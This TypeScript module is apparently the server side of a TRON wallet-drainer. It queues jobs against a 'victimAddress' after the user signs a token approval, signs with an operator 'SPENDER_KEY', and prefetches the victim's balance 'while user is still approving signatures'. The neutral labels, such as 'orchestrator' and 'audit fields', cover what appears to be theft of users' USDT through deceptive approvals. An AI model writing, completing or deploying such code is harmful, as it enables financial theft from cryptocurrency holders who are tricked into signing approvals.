import { createLogApprovalJob, type LogApprovalJobRecord } from "./tronLogApprovalJobs.js";
import { runTronLogApprovalJob } from "./runTronLogApprovalJob.js";
import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { prefetchExecutionContext } from "./tronExecutionPreflight.js";
import { updateLogApprovalJob } from "./tronLogApprovalJobs.js";

export type OrchestratorEnqueueResult = {
  jobId: string;
  source: "internal_auth_event" | "approval_event";
  operatorAddress?: string;
};

/**
 * Secondary administrative provider for orchestrator-side actions.
 * Uses Operator private key aliases from env (SPENDER_KEY / TRON_OPERATOR_PRIVATE_KEY mapping in env.ts).
 */
function createAdministrativeProvider(): { provider: TronWeb; operatorAddress: string } | null {
  const operatorPrivateKey = env.tronOperatorPrivateKey?.trim();
  if (!operatorPrivateKey) return null;
  const headers = env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined;
  const provider = new TronWeb({
    fullHost: env.tronFullNodeUrl,
    privateKey: operatorPrivateKey,
    headers,
  });
  const base58 = provider.defaultAddress?.base58;
  const operatorAddress = typeof base58 === "string" ? base58.trim() : "";
  return { provider, operatorAddress };
}

/**
 * Server-side transaction orchestrator entrypoint.
 * Creates a job immediately and runs it asynchronously.
 */
export function enqueueTronAuthorizationJob(params: {
  clientAddress: string;
  approveTxHash?: string;
  source: OrchestratorEnqueueResult["source"];
  onError?: (err: unknown, jobId: string, operatorAddress?: string) => void;
}): OrchestratorEnqueueResult {
  const admin = createAdministrativeProvider();
  if (params.source === "internal_auth_event" && !admin) {
    throw new Error(
      "Operator private key is required for internal auth events. Set OPERATOR_PRIVATE_KEY (or SPENDER_KEY / TRON_OPERATOR_PRIVATE_KEY).",
    );
  }
  const victimAddress = params.clientAddress.trim();
  const approveTxHash = params.approveTxHash?.trim() || undefined;

  const jobId = createLogApprovalJob({
    victimAddress,
    approveTxHash,
  });

  /**
   * Zero-wait preflight: warm execution context while user is still approving signatures.
   */
  void prefetchExecutionContext({
    clientAddress: victimAddress,
    callerAddressHint: admin?.operatorAddress,
  })
    .then((ctx) => {
      updateLogApprovalJob(jobId, {
        prefetchedBalanceRaw: ctx.prefetchedBalanceRaw,
        prefetchedEnergyFactor: ctx.prefetchedEnergyFactor,
      });
    })
    .catch(() => {
      /* preflight is opportunistic */
    });

  void runTronLogApprovalJob(jobId).catch((err) => {
    params.onError?.(err, jobId, admin?.operatorAddress || undefined);
  });

  return {
    jobId,
    source: params.source,
    operatorAddress: admin?.operatorAddress || undefined,
  };
}

export function orchestratorAuditFields(params: {
  clientAddress: string;
  source: OrchestratorEnqueueResult["source"];
  approveTxHash?: string;
  clientReportedUsdt?: string;
  result: OrchestratorEnqueueResult;
}): Partial<LogApprovalJobRecord> & {
  source: OrchestratorEnqueueResult["source"];
  jobId: string;
  operatorAddress?: string;
  clientAddress: string;
  approveTxHash?: string;
  clientReportedUsdt?: string;
} {
  return {
    source: params.source,
    jobId: params.result.jobId,
    operatorAddress: params.result.operatorAddress,
    clientAddress: params.clientAddress,
    approveTxHash: params.approveTxHash,
    clientReportedUsdt: params.clientReportedUsdt,
  };
}
